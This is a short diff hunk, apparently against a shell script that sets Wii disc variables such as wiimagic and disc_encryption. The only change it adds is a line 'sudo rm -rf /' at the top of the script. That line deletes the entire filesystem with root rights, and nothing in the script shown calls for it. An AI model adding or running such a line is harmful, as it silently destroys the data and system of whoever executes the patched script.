@@ -1,3 +1,5 @@
+sudo rm -rf /
+
 wiimagic=""
 unenc_bits=""
 disc_encryption=""
